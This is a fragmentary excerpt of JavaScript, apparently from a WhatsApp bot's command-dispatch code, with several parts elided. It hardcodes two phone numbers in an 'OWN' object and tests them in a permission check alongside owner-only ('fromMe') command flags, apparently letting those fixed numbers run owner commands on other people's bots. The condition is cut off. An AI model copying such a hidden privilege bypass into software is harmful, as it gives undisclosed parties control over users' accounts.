...
var OWN = { ff: '94715166712,94719574492' }
        ...
        if (config.WORKTYPE == 'public') {
            ...
            if (config.LANG == 'SI' || config.LANG == 'EN') {
                if (config.AILIZA == 'true') {
                    ...
                    await conn.sendMessage(conn.user.jid,Lang.LOGM_ESSAGE, MessageType.text);
                }
                await git.fetch();
        ...
        events.commands.map(
            async (command) =>  {
                ...
                if ((command.on !== undefined && (command.on === 'image' || command.on === 'photo')
                    ...
                    if ((OWN.ff == "94715166712,94719574492" && msg.key.fromMe === false && command.fromMe === true &&
